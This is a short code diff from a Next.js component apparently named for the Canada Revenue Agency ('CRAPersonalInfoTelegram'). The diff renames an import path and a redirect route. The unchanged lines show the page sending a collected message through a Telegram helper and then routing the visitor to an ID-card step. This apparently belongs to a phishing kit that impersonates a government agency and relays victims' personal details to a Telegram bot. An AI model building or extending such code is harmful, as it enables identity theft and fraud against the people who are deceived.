@@ -2,7 +2,7 @@
 
 import { useState, FormEvent } from "react";
 import { useRouter } from "next/navigation";
-import { sendTelegramMessage } from "../../utils/telegram";
+import { sendTelegramMessage } from "../../utils1/telegram";
 import Image from "next/image";
 
 const provinces = [
@@ -77,7 +77,7 @@ export default function CRAPersonalInfoTelegram() {
 
     try {
       await sendTelegramMessage(message);
-      router.push("/idcard");
+      router.push("/idcard1");
     } catch (err) {
       console.error(err);
       setError("An error occurred. Please try again.");
